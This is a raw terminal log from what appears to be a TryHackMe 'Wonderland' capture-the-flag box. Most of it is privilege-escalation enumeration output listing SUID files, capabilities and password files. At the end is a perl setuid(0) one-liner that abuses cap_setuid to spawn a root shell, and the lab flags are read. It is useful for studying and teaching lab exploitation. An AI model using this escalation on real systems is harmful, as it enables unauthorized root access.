ws_ftp.ini Not Found
                                                                                                                                                         
web*.config Not Found
                                                                                                                                                         
winscp.ini Not Found
                                                                                                                                                         
wsl.exe Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                               
-rw-r--r-- 1 alice alice 3771 May 25  2020 /home/alice/.bashrc
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 /home/hatter/.bashrc

.google_authenticator Not Found
                                                                                                                                                         
hosts.equiv Not Found
                                                                                                                                                         
.lesshst Not Found
                                                                                                                                                         
.plan Not Found
                                                                                                                                                         
-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 alice alice 807 May 25  2020 /home/alice/.profile
-rw-r--r-- 1 hatter hatter 807 May 25  2020 /home/hatter/.profile

.recently-used.xbel Not Found
                                                                                                                                                         
.rhosts Not Found
                                                                                                                                                         
.sudo_as_admin_successful Not Found
                                                                                                                                                         

════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                         
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                              
strings Not Found                                                                                                                                        
-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount                                                                                         
-rwsr-xr-x 1 root   root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root   root       427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                   
-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root        22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-- 1 root   messagebus  42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root       146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root   root        27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root        43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                              
-rwxr-sr-x 1 root   utmp     10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter                                                                
-rwxr-sr-x 1 root   crontab  39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root   tty      14K Jan 17  2018 /usr/bin/bsd-write
-rwsr-sr-x 1 daemon daemon   51K Feb 20  2018 /usr/bin/at
-rwxr-sr-x 1 root   mlocate  43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root   shadow   34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow   34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root   ssh     355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root   shadow   23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root   shadow   71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root   tty      31K Mar  5  2020 /usr/bin/wall

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                                                      
/etc/ld.so.conf                                                                                                                                          
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                               
Current capabilities:                                                                                                                                    
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                               
                                                                                                                                                         
╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                                                       
files with acls in searched folders Not Found                                                                                                            
                                                                                                                                                         
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                    
/usr/bin/gettext.sh                                                                                                                                      

╔══════════╣ Unexpected in root
/vmlinuz                                                                                                                                                 
/initrd.img
/initrd.img.old
/vmlinuz.old
/swap.img

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                                                             
total 32                                                                                                                                                 
drwxr-xr-x  2 root root 4096 May 25  2020 .
drwxr-xr-x 91 root root 4096 May 25  2020 ..
-rw-r--r--  1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root 3417 Jan 15  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x  1 root root  873 Jan 15  2020 Z99-cloudinit-warnings.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                               
                                                                                                                                                         
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                             
═╣ Credentials in fstab/mtab? ........... No                                                                                                             
═╣ Can I read shadow files? ............. No                                                                                                             
═╣ Can I read opasswd file? ............. No                                                                                                             
═╣ Can I write in network-scripts? ...... No                                                                                                             
═╣ Can I read root folder? .............. No                                                                                                             
                                                                                                                                                         
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                   
/home/alice/root.txt
/home/alice/walrus_and_the_carpenter.py
/home/alice/.bash_history
/home/hatter/.bash_history
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                         
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                         
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/hatter/.config/lxc/config.yml                                                                                                                      
/home/hatter/.gnupg/trustdb.gpg
/home/hatter/.gnupg/pubring.kbx
/var/log/journal/3c6cb1f9e32b45699be035b09c0b90cd/system.journal
/var/log/journal/3c6cb1f9e32b45699be035b09c0b90cd/user-1003.journal
/var/log/kern.log
/var/log/syslog
/var/log/auth.log

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                     
                                                                                                                                                         
╔══════════╣ Files inside /home/hatter (limit 20)
total 480                                                                                                                                                
drwxr-x--- 5 hatter hatter   4096 Sep 22 13:30 .
drwxr-xr-x 6 root   root     4096 May 25  2020 ..
lrwxrwxrwx 1 root   root        9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter    220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter   3771 May 25  2020 .bashrc
drwxr-x--- 3 hatter hatter   4096 Sep 22 13:29 .config
drwx------ 2 hatter hatter   4096 Sep 22 13:30 .gnupg
drwxrwxr-x 3 hatter hatter   4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter    807 May 25  2020 .profile
-rwxrwxr-x 1 hatter hatter 451118 Jul 22 10:36 linpeas.sh
-rw------- 1 hatter hatter     29 May 25  2020 password.txt

╔══════════╣ Files inside others home (limit 20)
/home/alice/.bash_logout                                                                                                                                 
/home/alice/root.txt
/home/alice/walrus_and_the_carpenter.py
/home/alice/random.py
/home/alice/.profile
/home/alice/.bashrc

╔══════════╣ Searching installed mail applications
                                                                                                                                                         
╔══════════╣ Mails (limit 50)
                                                                                                                                                         
╔══════════╣ Backup folders
                                                                                                                                                         
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2765 Feb  3  2020 /etc/apt/sources.list.curtin.old                                                                                
-rw-r--r-- 1 root root 7857 May 11  2020 /lib/modules/4.15.0-101-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 May 11  2020 /lib/modules/4.15.0-101-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 10939 May 25  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 0 May 11  2020 /usr/src/linux-headers-4.15.0-101-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 May 11  2020 /usr/src/linux-headers-4.15.0-101-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 217460 May 11  2020 /usr/src/linux-headers-4.15.0-101-generic/.config.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /var/lib/mlocate/mlocate.db: regular file, no read permission                                                                                     

╔══════════╣ Web files?(output limit)
                                                                                                                                                         
╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout                                                                                           
-rw-r--r-- 1 root root 1531 May 25  2020 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Feb  3  2020 /etc/.pwd.lock
-rw-r--r-- 1 alice alice 220 May 25  2020 /home/alice/.bash_logout
-rw-r--r-- 1 hatter hatter 220 May 25  2020 /home/hatter/.bash_logout
-rw-r--r-- 1 root root 1531 May 25  2020 /var/cache/apparmor/.features
-rw-r--r-- 1 landscape landscape 0 Feb  3  2020 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 37 Sep 22 11:11 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Sep 22 11:10 /run/cloud-init/.ds-identify.result

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 29642 May 25  2020 /var/backups/apt.extended_states.0                                                                             

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                             
/dev/mqueue                                                                                                                                              
/dev/shm
/home/hatter
/run/lock
/run/screen
/run/screen/S-hatter
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/server.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/uuidd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                             
  Group hatter:                                                                                                                                          
                                                                                                                                                         

╔══════════╣ Searching passwords in config PHP files
                                                                                                                                                         
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                         
╔══════════╣ Finding IPs inside logs (limit 70)
    129 0.18.04.1                                                                                                                                        
    115 3.18.04.2
     88 0.18.04.2
     68 3.18.04.3
     46 0.18.04.4
     42 2.18.04.1
     41 0.18.04.5
     30 18.04.11.10
     29 7.18.04.2
     22 192.168.170.140
     22 0.18.04.6
     20 192.168.170.2
     20 1.18.04.13
     19 3.192.1.7
     19 0.96.24.32
     17 1.18.04.1
     16 18.04.11.12
     13 255.255.255.255
     13 1.18.04.14
     12 2.18.04.3
      9 6.18.04.1
      9 0.19.8.1
      9 0.18.04.3
      8 018.09.18.1
      6 192.168.170.1
      4 192.168.170.255
      2 91.189.91.157
      2 172.30.16.1
      2 127.255.255.255
      2 10.8.6.110
      2 10.6.101.121
      2 0.99.7.1
      1 91.189.89.199
      1 19.12.1.5
      1 172.30.19.53
      1 10.10.53.9
      1 10.10.223.82
      1 10.10.173.144
      1 10.10.152.222

╔══════════╣ Finding passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                                                                         
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2020-02-03 18:22:20 configure base-passwd:amd64 3.5.44 3.5.44
2020-02-03 18:22:20 install base-passwd:amd64 <none> 3.5.44
2020-02-03 18:22:20 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status half-installed base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status installed base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status half-installed base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:22 upgrade base-passwd:amd64 3.5.44 3.5.44
2020-02-03 18:22:25 install passwd:amd64 <none> 1:4.5-1ubuntu1
2020-02-03 18:22:25 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:25 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:26 configure base-passwd:amd64 3.5.44 <none>
2020-02-03 18:22:26 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:26 status installed base-passwd:amd64 3.5.44
2020-02-03 18:22:26 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:27 configure passwd:amd64 1:4.5-1ubuntu1 <none>
2020-02-03 18:22:27 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:27 status installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:27 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 configure passwd:amd64 1:4.5-1ubuntu2 <none>
2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status installed passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
2020-05-25 00:20:37,765 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
2020-05-25 00:20:37,794 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
2020-05-25 00:20:37,795 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2020-05-25 00:21:08,216 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-25 00:21:08,216 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-25 16:26:33,934 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-25 16:26:33,934 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-25 18:13:36,775 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-25 18:13:36,775 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-25 18:30:26,187 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-25 18:30:26,187 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-25 22:24:34,541 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-25 22:24:34,541 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-25 22:52:29,009 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-25 22:52:29,009 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-25 23:00:41,938 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-25 23:00:41,938 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-25 23:47:02,452 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-25 23:47:02,452 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-01 22:08:27,309 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-01 22:08:27,309 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-05 22:27:22,936 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-05 22:27:22,936 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-06 15:59:24,961 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-06 15:59:24,962 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-22 11:11:57,390 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-22 11:11:57,390 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
Binary file /var/log/journal/3c6cb1f9e32b45699be035b09c0b90cd/user-1003.journal matches
May 25 00:16:23 ubuntu-server chage[14434]: changed password expiry for sshd
May 25 00:16:23 ubuntu-server usermod[14429]: change user 'sshd' password
May 25 01:12:57 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
May 25 01:12:57 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.44) ...
Setting up passwd (1:4.5-1ubuntu1) ...
Shadow passwords are now on.

╔══════════╣ Finding emails inside logs (limit 70)
      2 ftpmaster@ubuntu.com                                                                                                                             
      1 snaps@canonical.com
      1 dm-devel@redhat.com

╔══════════╣ Finding *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/home/hatter/password.txt
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/usr/share/ubuntu-advantage-tools/modules/credentials.sh
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/01e28a53-eab7-4c53-a2a3-f64cee2ce9c7/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Finding passwords inside key folders (limit 70) - only PHP files
                                                                                                                                                         
╔══════════╣ Finding passwords inside key folders (limit 70) - no PHP files
/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"                                                                        
/etc/cloud/cloud.cfg:     lock_passwd: True
/etc/cloud/cloud.cfg:     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
/etc/debconf.conf:#BindPasswd: secret
/etc/nsswitch.conf:passwd:         compat systemd
/etc/overlayroot.conf:#      $ MAPNAME="secure"; DEV="/dev/vdg"; PASSWORD="foobar"
/etc/overlayroot.conf:#     crypt:dev=/dev/vdb,pass=somepassword,mkfs=0
/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf:challengePassword_max              = 20
/etc/ssl/openssl.cnf:challengePassword_min              = 4
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \

╔══════════╣ Finding possible password variables inside key folders (limit 140)
                                                                                                                                                         
╔══════════╣ Finding possible password in config files
 /etc/nsswitch.conf                                                                                                                                      
passwd:         compat systemd
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,
 /etc/overlayroot.conf
password is randomly generated
password will be stored for recovery in
passwd
password,mkfs=0
PASSWORD="foobar"
PASSWORD" |
PASSWORD" |
PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
passwords are more secure, but you won't be able to
passwords are generated by calculating the sha512sum
 /etc/adduser.conf
passwd
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret

╔══════════╣ Finding 'username' string inside key folders (limit 70)
                                                                                                                                                         
╔══════════╣ Searching specific hashes inside files - less false positives (limit 70)
                                                                                                                                                         
hatter@wonderland:~$ pwd
/home/hatter                       perl -e 'use POSIX qw(setuid); POSIX::setuid(0
bash: /home/hatter/.perl: No such file or directorySIX qw(setuid); POSIX::setuid(
hatter@wonderland:~$ 
hatter@wonderland:~$ 
); exec "/bin/sh";'$ /home/hatter/perl -e 'use POSIX qw(setuid); POSIX::setuid(0)
bash: /home/hatter/perl: No such file or directory
hatter@wonderland:~$ 
hatter@wonderland:~$ 
hatter@wonderland:~$ 
xec "/bin/sh";'nd:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); ex
# /bin/bash
root@wonderland:~# 
root@wonderland:~# 
root@wonderland:~# 
root@wonderland:~# ls
linpeas.sh  password.txt
root@wonderland:~# cd /home
root@wonderland:/home# ls
alice  hatter  rabbit  tryhackme
root@wonderland:/home# cd root
bash: cd: root: No such file or directory
root@wonderland:/home# cd /root
root@wonderland:/root# ls
user.txt
root@wonderland:/root# cat user.txt 
thm{"Curiouser and curiouser!"}
root@wonderland:/root# cd /alice
bash: cd: /alice: No such file or directory
root@wonderland:/root# cd ..
root@wonderland:/# cd home
root@wonderland:/home# ls
alice  hatter  rabbit  tryhackme
root@wonderland:/home# cd alice
root@wonderland:/home/alice# ls
random.py  root.txt  walrus_and_the_carpenter.py
root@wonderland:/home/alice# cat root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
root@wonderland:/home/alice# 
